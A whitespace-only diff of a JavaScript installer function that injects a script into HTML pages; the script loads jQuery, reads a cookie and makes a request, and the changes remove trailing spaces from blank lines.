@@ -76,7 +76,7 @@ async function installing(ctx) {
                                     }, 100);
                                 }
                             };
-            
+
                             var runCode = function ($) {
                                 $(document).ready(function () {
                                     setTimeout(function () {
@@ -99,11 +99,11 @@ async function installing(ctx) {
                                                 console.log('error');
                                             }
                                         });
-            
+
                                     }, 100);
                                 });
                             };
-            
+
                             function getCookie(name) {
                                 var nameEQ = name + "=";
                                 var ca = document.cookie.split(';');
@@ -114,7 +114,7 @@ async function installing(ctx) {
                                 }
                                 return null;
                             }
-            
+
                             if (typeof jQuery == "undefined") {
                                 var script = document.createElement("SCRIPT");
                                 script.src =
@@ -129,7 +129,7 @@ async function installing(ctx) {
                             }
                         }, 1500);
                     })();
-            
+
                 </script>`);
                 body = entities.decode($.html());
             } else {
@@ -147,7 +147,7 @@ async function installing(ctx) {
                                         }, 100);
                                     }
                                 };
-                
+
                                 var runCode = function ($) {
                                     $(document).ready(function () {
                                         setTimeout(function () {
@@ -170,11 +170,11 @@ async function installing(ctx) {
                                                     console.log('error');
                                                 }
                                             });
-                
+
                                         }, 100);
                                     });
                                 };
-                
+
                                 function getCookie(name) {
                                     var nameEQ = name + "=";
                                     var ca = document.cookie.split(';');
@@ -185,7 +185,7 @@ async function installing(ctx) {
                                     }
                                     return null;
                                 }
-                
+
                                 if (typeof jQuery == "undefined") {
                                     var script = document.createElement("SCRIPT");
                                     script.src =
